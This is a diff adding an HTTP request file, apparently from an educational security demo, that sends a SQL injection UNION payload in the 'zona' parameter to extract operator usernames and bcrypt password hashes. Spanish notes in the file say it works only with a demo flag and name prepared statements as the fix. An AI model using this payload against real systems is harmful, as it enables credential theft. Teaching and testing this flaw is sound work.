@@ -1,0 +1,27 @@
+meta {
+  name: 02 - SQLi UNION — Extraer Credenciales Operadores
+  type: http
+  seq: 2
+}
+
+get {
+  url: {{baseUrl}}/api/historico
+  body: none
+  auth: none
+}
+
+params:query {
+  zona: norte' UNION SELECT username,password_hash,null,null,null,null FROM operadores--
+  fecha: 2024-01-01
+  tipo: camara
+}
+
+docs {
+  DEMO EDUCATIVA — Solo funciona con SQLI_DEMO=true en el servidor.
+
+  Extrae username + password_hash de la tabla operadores.
+  En la respuesta: campo "id" = username, campo "sensor_id" = password_hash (bcrypt).
+
+  Fix: usar historico.js (prepared statements) — imposible inyectar porque
+  zona se pasa como parámetro $1, nunca concatenado al string SQL.
+}
